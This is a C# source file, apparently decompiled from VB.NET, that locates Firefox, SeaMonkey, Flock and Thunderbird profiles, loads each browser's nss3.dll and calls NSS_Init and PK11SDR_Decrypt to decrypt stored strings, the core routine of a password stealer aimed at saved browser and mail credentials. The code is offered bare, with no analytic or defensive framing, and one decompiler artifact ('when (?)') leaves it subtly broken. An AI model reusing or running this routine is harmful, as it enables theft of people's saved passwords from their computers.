using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

[StandardModule]
internal sealed class Firefox
{
    private static List<IntPtr> hModuleList = new List<IntPtr>();
    private static bool is64BitOperatingSystem = (is64BitProcess || InternalCheckIsWow64());
    private static bool is64BitProcess = (IntPtr.Size == 8);
    private static IntPtr NSS3;

    private static T CreateAPI<T>(IntPtr hModule, string method)
    {
        T delegateForFunctionPointer;
        int num2;
        try
        {
            int num3;
        Label_0000:
            ProjectData.ClearProjectError();
            int num = 1;
        Label_0007:
            num3 = 2;
            delegateForFunctionPointer = (T) Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, method), typeof(T));
            goto Label_0082;
        Label_0029:
            num2 = 0;
            switch ((num2 + 1))
            {
                case 1:
                    goto Label_0000;

                case 2:
                    goto Label_0007;

                case 3:
                    goto Label_0082;

                default:
                    goto Label_0077;
            }
        Label_0045:
            num2 = num3;
            switch (num)
            {
                case 0:
                    goto Label_0077;

                case 1:
                    goto Label_0029;
            }
        }
        catch (Exception exception1) when (?)
        {
            ProjectData.SetProjectError(exception1);
            goto Label_0045;
        }
    Label_0077:
        throw ProjectData.CreateProjectError(-2146828237);
    Label_0082:
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
        return delegateForFunctionPointer;
    }

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool FreeLibrary(IntPtr hModule);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    public static bool InternalCheckIsWow64()
    {
        if (((Environment.OSVersion.Version.Major != 5) || (Environment.OSVersion.Version.Minor < 1)) && (Environment.OSVersion.Version.Major < 6))
        {
            return false;
        }
        using (Process process = Process.GetCurrentProcess())
        {
            bool flag2;
            if (!IsWow64Process(process.Handle, ref flag2))
            {
                return false;
            }
            return flag2;
        }
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("Kernel32.dll", SetLastError=true)]
    public static extern bool IsWow64Process(IntPtr hProcess, ref bool wow64Process);
    public static void Load(string path)
    {
        if (NSS_Init(path) == 0L)
        {
        }
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr LoadLibrary(string dllFilePath);
    public static object mozDecryptString(string str)
    {
        object obj2;
        try
        {
            StringBuilder inStr = new StringBuilder(str);
            int num = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, inStr, inStr.Length);
            TSECItem result = new TSECItem();
            IntPtr ptr = new IntPtr(num);
            TSECItem data = (TSECItem) Marshal.PtrToStructure(ptr, typeof(TSECItem));
            if ((PK11SDR_Decrypt(ref data, ref result, 0) == 0) && (result.SECItemLen != 0))
            {
                object objectValue = new byte[(result.SECItemLen - 1) + 1];
                object[] objArray = new object[4];
                ptr = new IntPtr(result.SECItemData);
                objArray[0] = ptr;
                objArray[1] = RuntimeHelpers.GetObjectValue(objectValue);
                objArray[2] = 0;
                objArray[3] = result.SECItemLen;
                object[] arguments = objArray;
                bool[] copyBack = new bool[] { false, true, false, true };
                NewLateBinding.LateCall(null, typeof(Marshal), "Copy", arguments, null, null, copyBack, true);
                if (copyBack[1])
                {
                    objectValue = RuntimeHelpers.GetObjectValue(arguments[1]);
                }
                if (copyBack[3])
                {
                    result.SECItemLen = (int) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments[3]), typeof(int));
                }
                return Encoding.UTF8.GetString((byte[]) objectValue);
            }
            obj2 = string.Empty;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            obj2 = "No Data!";
            ProjectData.ClearProjectError();
        }
        return obj2;
    }

    public static object mozProfilePath(string browser)
    {
        string str = "";
        string str2 = "";
        try
        {
            if (browser == "firefox")
            {
                str = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\Firefox\";
                str2 = new Regex(@"Path=([A-z0-9\/\.]+)").Match(File.ReadAllText(str + "profiles.ini")).Groups[1].Value;
            }
            else if (browser == "seamonkey")
            {
                str = Environment.GetEnvironmentVariable("APPDATA") + @"\Mozilla\SeaMonkey\";
                str2 = new Regex(@"Path=([A-z0-9\/\.]+)").Match(File.ReadAllText(str + "profiles.ini")).Groups[1].Value;
            }
            else if (browser == "flock")
            {
                str = Environment.GetEnvironmentVariable("APPDATA") + @"\Flock\Browser\";
                str2 = new Regex(@"Path=([A-z0-9\/\.]+)").Match(File.ReadAllText(str + "profiles.ini")).Groups[1].Value;
            }
            else if (browser == "thunderbird")
            {
                str = Environment.GetEnvironmentVariable("APPDATA") + @"\Thunderbird\";
                str2 = new Regex(@"Path=([A-z0-9\/\.]+)").Match(File.ReadAllText(str + "profiles.ini")).Groups[1].Value;
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            ProjectData.ClearProjectError();
        }
        return (str + str2 + @"\");
    }

    public static long NSS_Init(string configdir)
    {
        string path = "";
        if (Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\"))
        {
            path = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Firefox\";
        }
        if (is64BitOperatingSystem && Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Mozilla Firefox\"))
        {
            path = Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Mozilla Firefox\";
        }
        string str4 = "";
        if (Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Thunderbird\"))
        {
            str4 = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Mozilla Thunderbird\";
        }
        if (is64BitOperatingSystem && Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Mozilla Thunderbird\"))
        {
            str4 = Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Mozilla Thunderbird\";
        }
        string str3 = "";
        if (Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\SeaMonkey\"))
        {
            str3 = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\SeaMonkey\";
        }
        if (is64BitOperatingSystem && Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\SeaMonkey\"))
        {
            str3 = Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\SeaMonkey\";
        }
        string str = "";
        if (Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Flock\"))
        {
            str = Environment.GetEnvironmentVariable("PROGRAMFILES") + @"\Flock\";
        }
        if (is64BitOperatingSystem && Directory.Exists(Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Flock\"))
        {
            str = Environment.GetEnvironmentVariable("PROGRAMFILES(x86)") + @"\Flock\";
        }
        if (Directory.Exists(path))
        {
            hModuleList.Add(LoadLibrary(path + @"\msvcr100.dll"));
            hModuleList.Add(LoadLibrary(path + @"\msvcp100.dll"));
            hModuleList.Add(LoadLibrary(path + @"\msvcr120.dll"));
            hModuleList.Add(LoadLibrary(path + @"\msvcp120.dll"));
            hModuleList.Add(LoadLibrary(path + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(path + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(path + @"\vcruntime140.dll"));
            hModuleList.Add(LoadLibrary(path + Convert.ToString("mozglue.dll")));
            NSS3 = LoadLibrary(path + Convert.ToString("nss3.dll"));
            hModuleList.Add(NSS3);
            return CreateAPI<DLLFunctionDelegate>(NSS3, "NSS_Init")(configdir);
        }
        if (Directory.Exists(str4))
        {
            hModuleList.Add(LoadLibrary(str4 + @"\msvcr100.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\msvcp100.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\msvcr120.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\msvcp120.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str4 + @"\vcruntime140.dll"));
            hModuleList.Add(LoadLibrary(str4 + Convert.ToString("mozglue.dll")));
            NSS3 = LoadLibrary(str4 + Convert.ToString("nss3.dll"));
            hModuleList.Add(NSS3);
            return CreateAPI<DLLFunctionDelegate>(NSS3, "NSS_Init")(configdir);
        }
        if (Directory.Exists(str3))
        {
            hModuleList.Add(LoadLibrary(str3 + @"\msvcr100.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\msvcp100.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\msvcr120.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\msvcp120.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str3 + @"\vcruntime140.dll"));
            hModuleList.Add(LoadLibrary(str3 + Convert.ToString("mozglue.dll")));
            NSS3 = LoadLibrary(str3 + Convert.ToString("nss3.dll"));
            hModuleList.Add(NSS3);
            return CreateAPI<DLLFunctionDelegate>(NSS3, "NSS_Init")(configdir);
        }
        if (Directory.Exists(str))
        {
            hModuleList.Add(LoadLibrary(str + @"\msvcr100.dll"));
            hModuleList.Add(LoadLibrary(str + @"\msvcp100.dll"));
            hModuleList.Add(LoadLibrary(str + @"\msvcr120.dll"));
            hModuleList.Add(LoadLibrary(str + @"\msvcp120.dll"));
            hModuleList.Add(LoadLibrary(str + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str + @"\msvcp140.dll"));
            hModuleList.Add(LoadLibrary(str + @"\vcruntime140.dll"));
            hModuleList.Add(LoadLibrary(str + Convert.ToString("mozglue.dll")));
            NSS3 = LoadLibrary(str + Convert.ToString("nss3.dll"));
            hModuleList.Add(NSS3);
            return CreateAPI<DLLFunctionDelegate>(NSS3, "NSS_Init")(configdir);
        }
        return 0L;
    }

    public static long NSS_Shutdown() => 
        CreateAPI<DLLFunctionDelegate6>(NSS3, "NSS_Shutdown")();

    public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen) => 
        CreateAPI<DLLFunctionDelegate4>(NSS3, "NSSBase64_DecodeBuffer")(arenaOpt, outItemOpt, inStr, inLen);

    public static long PK11_Authenticate(long slot, bool loadCerts, long wincx) => 
        CreateAPI<DLLFunctionDelegate3>(NSS3, "PK11_Authenticate")(slot, loadCerts, wincx);

    public static long PK11_GetInternalKeySlot() => 
        CreateAPI<DLLFunctionDelegate2>(NSS3, "PK11_GetInternalKeySlot")();

    public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx) => 
        CreateAPI<DLLFunctionDelegate5>(NSS3, "PK11SDR_Decrypt")(ref data, ref result, cx);

    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    private static extern bool SetDllDirectory(string lpPathName);
    public static void Unload()
    {
        try
        {
            List<IntPtr>.Enumerator enumerator;
            NSS_Shutdown();
            try
            {
                enumerator = hModuleList.GetEnumerator();
                while (enumerator.MoveNext())
                {
                    IntPtr current = enumerator.Current;
                    try
                    {
                        FreeLibrary(current);
                        continue;
                    }
                    catch (Exception exception1)
                    {
                        ProjectData.SetProjectError(exception1);
                        Exception exception = exception1;
                        ProjectData.ClearProjectError();
                        continue;
                    }
                }
            }
            finally
            {
                enumerator.Dispose();
            }
        }
        catch (Exception exception2)
        {
            ProjectData.SetProjectError(exception2);
            ProjectData.ClearProjectError();
        }
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate(string configdir);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate2();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int DLLFunctionDelegate5(ref Firefox.TSECItem data, ref Firefox.TSECItem result, int cx);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long DLLFunctionDelegate6();

    [StructLayout(LayoutKind.Sequential)]
    public struct TSECItem
    {
        public int SECItemType;
        public int SECItemData;
        public int SECItemLen;
    }
}

